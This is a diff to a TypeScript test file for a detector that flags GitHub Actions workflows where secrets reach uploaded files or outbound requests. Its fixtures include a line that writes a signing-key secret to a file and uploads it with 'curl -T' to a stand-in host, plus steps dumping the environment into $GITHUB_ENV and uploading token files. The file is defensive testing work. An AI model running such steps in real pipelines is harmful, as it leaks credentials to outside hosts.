@@ -766,24 +766,65 @@ describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: files followed by path", () => {
     expect(hits()).toEqual([9]);
   });
 
-  // After a $GITHUB_ENV export the whole step holds the secret, and only its
-  // explicit file writes are followed, so each write form must be parsed.
+  // After an export whose variable names cannot be told, the whole step holds
+  // the secret, and only its explicit file writes are followed, so each write
+  // form must be parsed.
   it.each([
     ["tee", "printf x | tee out.txt"],
     ["a lowercase PowerShell cmdlet", '"x" | out-file out.txt'],
     ["Python open for writing", `python3 -c "open('out.txt', 'w').write('x')"`],
-  ])("follows %s in a step after a $GITHUB_ENV export", (_label, write) => {
+  ])("follows %s in a step after an export of unknown names", (_label, write) => {
     workflow([
       ...HEAD,
       "    steps:",
       ...secretStep,
-      '        run: echo "TOKEN=$T" >> "$GITHUB_ENV"',
+      '        run: printenv >> "$GITHUB_ENV"',
       `      - run: ${write}`,
       "      - uses: actions/upload-artifact@v4",
       "        with:",
       "          path: out.txt",
     ]);
     expect(hits()).toEqual([10]);
+  });
+
+  it("follows a file under a computed directory to a later relative read of it", () => {
+    // A dotless name, so only the path decides, not a token in code.
+    workflow([
+      ...HEAD,
+      "    steps:",
+      '      - env: { T: "${{ secrets.SIGNING_KEY }}" }',
+      `        run: python3 -c "import os; d='out'; open(f'{d}/token','w').write(os.environ['T'])"`,
+      "      - run: curl -T out/token https://x.example/u",
+    ]);
+    expect(hits()).toEqual([9]);
+  });
+
+  it("does not count a secret tested in the step's if: as used by the step", () => {
+    workflow([
+      ...HEAD,
+      "    steps:",
+      "      - if: ${{ secrets.DEPLOY_KEY }}",
+      "        run: curl -fsS https://x.example/health",
+    ]);
+    expect(hits()).toEqual([]);
+  });
+
+  it("follows an exported name, not every later write", () => {
+    workflow([
+      ...HEAD,
+      "    steps:",
+      ...secretStep,
+      '        run: echo "TOKEN=$T" >> "$GITHUB_ENV"',
+      "      - run: npm test > report.txt",
+      '      - run: echo "$TOKEN" > token.txt',
+      "      - uses: actions/upload-artifact@v4",
+      "        with:",
+      "          path: report.txt",
+      "      - uses: actions/upload-artifact@v4",
+      "        with:",
+      "          path: token.txt",
+    ]);
+    expect(hits()).toEqual([14]);
   });
 
   it("keeps a heredoc body with the command that reads it", () => {
@@ -882,6 +923,31 @@ describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: linear on 5 MiB input", () => {
     expect(
       timed([...HEAD, "    steps:", "      - env:", "          T: ${{ secrets.X }}", `        run: curl -H ${quotes}`]),
     ).toBeLessThan(performanceBudget(15_000));
+  });
+
+  it("many deep paths just under the length cap", { timeout: performanceBudget(60_000) }, () => {
+    // 2,000 levels in under 4,096 characters: without the depth cap every
+    // ancestor prefix is kept, which is quadratic in memory per path.
+    const writes = Array.from({ length: 250 }, (_, i) => `          echo "$T" > ${"a/".repeat(2_000)}k${i}`);
+    expect(
+      timed([...HEAD, "    steps:", '      - env: { T: "${{ secrets.X }}" }', "        run: |", ...writes, "      - run: curl -T a https://x.example"]),
+    ).toBeLessThan(performanceBudget(5_000));
+  });
+
+  it("a glob with many stars, a deep path, a long fd, a long env word, many secret names", { timeout: performanceBudget(60_000) }, () => {
+    const secretStep = ['      - env: { T: "${{ secrets.X }}" }'];
+    // A 210-byte workflow that backtracked exponentially through a RegExp glob.
+    expect(timed([...HEAD, "    steps:", ...secretStep, `        run: echo "$T" > ${"a".repeat(200)}`, `      - run: ls ${"*a".repeat(20)}*b`])).toBeLessThan(performanceBudget(5_000));
+    // Ancestors of a 200,000-level path: quadratic memory before.
+    expect(timed([...HEAD, "    steps:", ...secretStep, `        run: echo "$T" > ${"a/".repeat(200_000)}k.txt`])).toBeLessThan(performanceBudget(15_000));
+    // The fd digits before a redirection.
+    expect(timed([...HEAD, "    steps:", ...secretStep, `        run: echo "$T" ${"1".repeat(1_000_000)}x>f.txt`])).toBeLessThan(performanceBudget(15_000));
+    // One long word with no colon in an env block scalar.
+    expect(timed([...HEAD, "    env:", "      T: ${{ secrets.K }}", "      U: |", "        " + "a".repeat(FIVE_MIB), "    steps:", "      - run: curl https://x.example"])).toBeLessThan(performanceBudget(15_000));
+    // Many secret names in the workflow env, and many steps.
+    const names = Array.from({ length: 50_000 }, (_, i) => `  N${i}: \${{ secrets.S${i} }}`);
+    const steps = Array.from({ length: 5_000 }, () => "      - run: echo ok");
+    expect(timed(["name: CI", "on: push", "env:", ...names, "jobs:", "  build:", "    runs-on: x", "    steps:", ...steps])).toBeLessThan(performanceBudget(15_000));
   });
 
   it("floods of globs against many tainted files", { timeout: performanceBudget(60_000) }, () => {
